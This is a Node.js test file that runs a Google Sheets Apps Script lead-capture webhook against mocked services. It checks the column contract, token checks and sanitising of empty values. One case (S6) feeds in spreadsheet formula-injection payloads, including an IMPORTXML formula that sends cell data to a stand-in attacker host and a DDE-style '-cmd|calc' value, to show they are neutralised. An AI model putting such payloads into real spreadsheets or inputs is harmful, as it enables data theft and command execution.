/**
 * scripts/apps-script-sheet-test.mjs
 *
 * Runs integrations/google-sheets/Code.gs OUTSIDE Google, against stubbed Apps Script services
 * (SpreadsheetApp / ContentService / LockService / PropertiesService / Logger), so the appender's
 * behaviour is real code output instead of "should work in the editor".
 *
 * Proves: header row creation and format, 11-column append order, wrong-width rejection,
 * token enforcement, empty-row no-op, formula-injection neutralisation, absent-value handling.
 *
 * Does NOT prove: a real Google Sheet, real authorisation, or real Apps Script HTTP behaviour.
 * The mock is deliberately the same shape as Apps Script's own API — nothing more.
 *
 * Run:  npm run test:sheet   (or: node scripts/apps-script-sheet-test.mjs)
 * Exit: 0 = every case passed, 1 = at least one failed.
 */
import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import vm from 'node:vm';

const SOURCE_PATH = resolve('integrations/google-sheets/Code.gs');
const SHEET_NAME = 'Leads';
const SPREADSHEET_NAME = 'Sheersh Portfolio — Leads';

/* ───────────────────────── stubbed Apps Script services ───────────────────────── */

class Range {
  constructor(sheet, row, col, numRows, numCols) {
    this.sheet = sheet;
    this.row = row;
    this.col = col;
    this.numRows = numRows;
    this.numCols = numCols;
    this.numberFormat = null;
  }
  getValue() {
    return (this.sheet.rows[this.row - 1] || [])[this.col - 1] ?? '';
  }
  getValues() {
    const out = [];
    for (let r = 0; r < this.numRows; r += 1) {
      const row = this.sheet.rows[this.row - 1 + r] || [];
      const line = [];
      for (let c = 0; c < this.numCols; c += 1) line.push(row[this.col - 1 + c] ?? '');
      out.push(line);
    }
    return out;
  }
  setValues(values) {
    values.forEach((line, r) => {
      const target = this.row - 1 + r;
      while (this.sheet.rows.length <= target) this.sheet.rows.push([]);
      line.forEach((value, c) => {
        this.sheet.rows[target][this.col - 1 + c] = value;
      });
    });
    return this;
  }
  setFontWeight() {
    return this;
  }
  setBackground() {
    return this;
  }
  setFontColor() {
    return this;
  }
  setNumberFormat(format) {
    this.numberFormat = format;
    this.sheet.timestampFormat = format;
    return this;
  }
}

class Sheet {
  constructor(name, spreadsheet) {
    this.name = name;
    this.spreadsheet = spreadsheet;
    this.rows = [];
    this.frozenRows = 0;
  }
  getName() {
    return this.name;
  }
  getParent() {
    return this.spreadsheet;
  }
  getLastRow() {
    return this.rows.length;
  }
  getMaxRows() {
    return Math.max(this.rows.length, 100);
  }
  appendRow(values) {
    this.rows.push(values.slice());
  }
  insertRowBefore(row) {
    this.rows.splice(row - 1, 0, []);
  }
  setFrozenRows(count) {
    this.frozenRows = count;
  }
  setColumnWidths() {
    return this;
  }
  getRange(row, col, numRows = 1, numCols = 1) {
    return new Range(this, row, col, numRows, numCols);
  }
}

function makeSpreadsheet() {
  const spreadsheet = {
    name: SPREADSHEET_NAME,
    sheets: [],
    getName() {
      return this.name;
    },
    getSheetByName(name) {
      return this.sheets.find((s) => s.name === name) || null;
    },
    insertSheet(name) {
      const sheet = new Sheet(name, this);
      this.sheets.push(sheet);
      return sheet;
    }
  };
  return spreadsheet;
}

/** Fresh sandbox per case so no state leaks between them. */
function loadScript({ properties = {}, spreadsheet, sheetName } = {}) {
  const props = { ...properties };
  if (sheetName) props.SHEET_NAME = sheetName;
  const ss = spreadsheet || makeSpreadsheet();
  const logs = [];

  const sandbox = {
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (key) => (key in props ? props[key] : null),
        setProperty: (key, value) => {
          props[key] = value;
        }
      })
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ss,
      openById: (id) => {
        if (!ss) throw new Error('no spreadsheet with id ' + id);
        return ss;
      }
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => true,
        releaseLock: () => {}
      })
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (text) => ({
        text,
        mimeType: null,
        setMimeType(type) {
          this.mimeType = type;
          return this;
        }
      })
    },
    Logger: { log: (line) => logs.push(String(line)) },
    console
  };
  vm.createContext(sandbox);
  vm.runInContext(SOURCE, sandbox, { filename: 'Code.gs' });
  return { sandbox, spreadsheet: ss, props, logs };
}

const SOURCE = await readFile(SOURCE_PATH, 'utf8');

/* ───────────────────────────────── harness ────────────────────────────────────── */

let pass = 0;
let fail = 0;
const failures = [];

function check(caseName, label, condition, detail) {
  if (condition) {
    console.log(`   ✓ ${label}`);
    pass += 1;
  } else {
    console.log(`   ✗ ${label}${detail !== undefined ? ` — got: ${JSON.stringify(detail)}` : ''}`);
    fail += 1;
    failures.push(`${caseName}: ${label}`);
  }
}

function title(text) {
  console.log(`\n── ${text} ` + '─'.repeat(Math.max(0, 74 - text.length)));
}

/** doPost takes the Apps Script event object. */
const post = (body, { token } = {}) => ({
  postData: { contents: JSON.stringify(body), type: 'application/json' },
  parameter: token === undefined ? {} : { token }
});

const bodyOf = (result) => JSON.parse(result.text);

const VALID_ROW = (over = []) => {
  const base = [
    '2026-09-13T16:10:25.000Z',
    'Form (website)',
    'Priya Raman',
    'Acme Corp',
    'priya@acmecorp.example',
    'Database & SQL Performance Rescue',
    '$5,000 – $15,000',
    '',
    'We have a 40M-row report that takes minutes.',
    'https://sheershtiwari.vercel.app/#hire',
    'lead_3f0f2a4e'
  ];
  over.forEach((value, index) => {
    if (value !== undefined) base[index] = value;
  });
  return base;
};

// ─────────────────────── CASE S1 — first write creates the header ────────────────
{
  const name = 'S1 empty sheet: header created, then the row appended';
  const { sandbox, spreadsheet } = loadScript();
  const res = bodyOf(sandbox.doPost(post({ row: VALID_ROW() })));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   SHEET    row1=' + JSON.stringify(sheet.rows[0]));
  console.log('   SHEET    row2=' + JSON.stringify(sheet.rows[1]));
  console.log('   RESPONSE ' + JSON.stringify(res));
  check(name, 'responds ok:true + appended:true, row 2', res.ok === true && res.appended === true && res.row === 2, res);
  check(
    name,
    'header row is the 11 canonical columns, in order',
    JSON.stringify(sheet.rows[0]) ===
      JSON.stringify(['Received', 'Source', 'Name / Title', 'Company', 'Email', 'Project / Type', 'Budget', 'Score', 'Message / Pitch', 'Link', 'ID']),
    sheet.rows[0]
  );
  check(name, 'sheet tab is auto-created as "' + SHEET_NAME + '"', sheet.name === SHEET_NAME, sheet.name);
  check(name, 'header is frozen', sheet.frozenRows === 1, sheet.frozenRows);
  check(name, 'column 1 is formatted as a timestamp', /yyyy-mm-dd/.test(sheet.timestampFormat || ''), sheet.timestampFormat);
  check(name, 'data row has 11 cells', sheet.rows[1].length === 11, sheet.rows[1]);
  check(name, 'column 1 is a real Date (sortable), not a string', Object.prototype.toString.call(sheet.rows[1][0]) === '[object Date]', String(sheet.rows[1][0]));
}

// ────────────── CASE S2 — a second write does NOT duplicate the header ───────────
{
  const name = 'S2 second write appends a row, header untouched';
  const { sandbox, spreadsheet } = loadScript();
  sandbox.doPost(post({ row: VALID_ROW() }));
  sandbox.doPost(post({ row: VALID_ROW(['2026-09-13T17:00:00.000Z', 'Hunter (Reddit)', 'Need a SQL tuning gig']) }));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   SHEET    row1=' + JSON.stringify(sheet.rows[0]));
  console.log('   SHEET    row3=' + JSON.stringify(sheet.rows[2]));
  check(name, 'last row is 3 (header + 2 leads), header written once', sheet.rows.length === 3 && sheet.rows[0][0] === 'Received', sheet.rows.length);
  check(name, 'hunter row keeps its own source label', sheet.rows[2][1] === 'Hunter (Reddit)', sheet.rows[2][1]);
}

// ────────────── CASE S3 — wrong width is refused, nothing is written ────────────
{
  const name = 'S3 a 10-value row is refused (silent column shift is the failure mode)';
  const { sandbox, spreadsheet } = loadScript();
  const res = bodyOf(sandbox.doPost(post({ row: VALID_ROW().slice(0, 10) })));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   RESPONSE ' + JSON.stringify(res));
  check(name, 'ok:false with the expected width in the message', res.ok === false && /exactly 11 values — got 10/.test(res.error || ''), res);
  check(name, 'nothing appended (no header either)', !sheet || sheet.rows.length === 0, sheet && sheet.rows.length);
}
{
  const name = 'S4 a raw lead object (not a row) is refused';
  const { sandbox } = loadScript();
  const res = bodyOf(sandbox.doPost(post({ name: 'Priya Raman', email: 'priya@acmecorp.example', message: 'raw lead shape' })));
  title(name);
  console.log('   RESPONSE ' + JSON.stringify(res));
  check(name, 'ok:false explaining the row contract', res.ok === false && /"row"/.test(res.error || ''), res);
}

// ────────────── CASE S5 — absent values: "" never null / "null" / "undefined" ────
{
  const name = 'S5 null / undefined / "undefined" cells become empty strings';
  const { sandbox, spreadsheet } = loadScript();
  const row = VALID_ROW();
  row[3] = null; // Company
  row[7] = undefined; // Score
  row[9] = 'null'; // Link — a literal "null" string must not reach a cell
  row[10] = 'undefined'; // ID
  sandbox.doPost(post({ row }));
  const written = spreadsheet.getSheetByName(SHEET_NAME).rows[1];
  title(name);
  console.log('   SHEET    row2=' + JSON.stringify(written));
  check(name, 'no cell is null/undefined', written.every((v) => v !== null && v !== undefined), written);
  check(name, 'no cell literally reads "null" or "undefined"', written.every((v) => v !== 'null' && v !== 'undefined'), written);
  check(name, 'Company (null) and Score (undefined) are ""', written[3] === '' && written[7] === '', written);
  check(name, 'Link/"null" and ID/"undefined" were cleaned to ""', written[9] === '' && written[10] === '', [written[9], written[10]]);
  check(name, 'the other columns survived intact', written[2] === 'Priya Raman' && written[4] === 'priya@acmecorp.example', written);
}

// ────────────── CASE S6 — formula injection is neutralised ──────────────────────
{
  const name = 'S6 leading = + - @ are neutralised (formula injection defence)';
  const { sandbox, spreadsheet } = loadScript();
  sandbox.doPost(
    post({
      row: VALID_ROW([
        '2026-09-13T16:10:25.000Z',
        'Form (website)',
        '=IMPORTXML("http://evil.example/?"&A1,"//x")',
        '+1-800-EVIL',
        '-cmd|calc',
        '@SUM(1+1)',
        '',
        '',
        'fine message',
        '',
        ''
      ])
    })
  );
  const written = spreadsheet.getSheetByName(SHEET_NAME).rows[1];
  title(name);
  console.log('   SHEET    row2=' + JSON.stringify(written));
  check(name, 'every dangerous cell is prefixed with an apostrophe', [written[2], written[3], written[4], written[5]].every((v) => String(v).startsWith("'")), [written[2], written[3], written[4], written[5]]);
  check(name, 'the value is preserved after the prefix', String(written[2]).slice(1).startsWith('=IMPORTXML'), written[2]);
  check(name, 'a benign cell is left alone', written[8] === 'fine message', written[8]);
}

// ────────────── CASE S7 — token enforcement ─────────────────────────────────────
{
  const name = 'S7 with LEAD_WEBHOOK_TOKEN set, a wrong or missing token is refused';
  const { sandbox, spreadsheet } = loadScript({ properties: { LEAD_WEBHOOK_TOKEN: 'unit-test-token' } });
  const missing = bodyOf(sandbox.doPost(post({ row: VALID_ROW() })));
  const wrong = bodyOf(sandbox.doPost(post({ row: VALID_ROW() }, { token: 'nope' })));
  const right = bodyOf(sandbox.doPost(post({ row: VALID_ROW() }, { token: 'unit-test-token' })));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   RESPONSE missing=' + JSON.stringify(missing));
  console.log('   RESPONSE wrong=' + JSON.stringify(wrong));
  console.log('   RESPONSE right=' + JSON.stringify(right));
  check(name, 'missing token → ok:false unauthorized', missing.ok === false && /unauthorized/.test(missing.error || ''), missing);
  check(name, 'wrong token → ok:false unauthorized', wrong.ok === false && /unauthorized/.test(wrong.error || ''), wrong);
  check(name, 'correct token → appended', right.ok === true && right.appended === true, right);
  check(name, 'only the authorised request wrote a row (header + 1)', sheet.rows.length === 2, sheet.rows.length);
}
{
  const name = 'S8 no token configured → open endpoint (the URL is the secret)';
  const { sandbox } = loadScript();
  const res = bodyOf(sandbox.doPost(post({ row: VALID_ROW() })));
  title(name);
  console.log('   RESPONSE ' + JSON.stringify(res));
  check(name, 'request without a token is accepted', res.ok === true && res.appended === true, res);
}

// ────────────── CASE S9 — empty row is a no-op, not an error ────────────────────
{
  const name = 'S9 all-empty row → appended:false, no header, no data';
  const { sandbox, spreadsheet } = loadScript();
  const res = bodyOf(sandbox.doPost(post({ row: ['', '', '', '', '', '', '', '', '', '', ''] })));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   RESPONSE ' + JSON.stringify(res));
  check(name, 'ok:true, appended:false (reachability probe)', res.ok === true && res.appended === false, res);
  check(name, 'sheet untouched', !sheet || sheet.rows.length === 0, sheet && sheet.rows.length);
}

// ────────────── CASE S10 — doGet health check + demo row ────────────────────────
{
  const name = 'S10 doGet: health payload, and ?demo=1 appends a labelled row';
  const { sandbox, spreadsheet } = loadScript();
  const health = bodyOf(sandbox.doGet({ parameter: {} }));
  const demo = bodyOf(sandbox.doGet({ parameter: { demo: '1' } }));
  const sheet = spreadsheet.getSheetByName(SHEET_NAME);
  title(name);
  console.log('   RESPONSE health=' + JSON.stringify(health));
  console.log('   RESPONSE demo=' + JSON.stringify(demo));
  check(name, 'health lists the 11 columns for eyeball verification', Array.isArray(health.columns) && health.columns.length === 11 && health.columns[0] === 'Received', health.columns);
  check(name, 'health says whether a token is required', health.tokenRequired === false, health.tokenRequired);
  check(name, 'demo appended a row', demo.ok === true && demo.appended === true && demo.demo === true, demo);
  check(name, 'the demo row is labelled and deletable', String(sheet.rows[1][2]).startsWith('DEMO ROW'), sheet.rows[1] && sheet.rows[1][2]);
  check(name, 'the demo row has 11 cells', sheet.rows[1].length === 11, sheet.rows[1].length);
}

// ────────────── CASE S11 — checkSetup runs and reports the wiring ───────────────
{
  const name = 'S11 checkSetup() reports sheet, header and token state';
  const { sandbox, logs } = loadScript();
  const out = sandbox.checkSetup();
  title(name);
  console.log('   LOG      ' + logs.join(' | ').replace(/\n/g, ' / '));
  check(name, 'reports OK with the sheet name', /^OK — sheet reachable: "Leads"/.test(out), out);
  check(name, 'reports the full header row', /Timestamp|Received/.test(out) && out.indexOf('ID') !== -1, out);
  check(name, 'reports the token state', /token required: false/.test(out), out);
  check(name, 'Logger.log was called (visible in Apps Script ▸ View ▸ Logs)', logs.length === 1, logs);
}

/* ───────────────────────────────── summary ────────────────────────────────────── */
console.log('\n' + '═'.repeat(76));
console.log(`RESULT: ${pass} assertions passed, ${fail} failed`);
if (failures.length) failures.forEach((f) => console.log(`   FAILED  ${f}`));
console.log(fail === 0 ? 'STATUS: ALL CASES PASS' : 'STATUS: FAILURES PRESENT');
console.log('═'.repeat(76));
process.exitCode = fail === 0 ? 0 : 1;
setTimeout(() => process.exit(process.exitCode), 5000).unref();
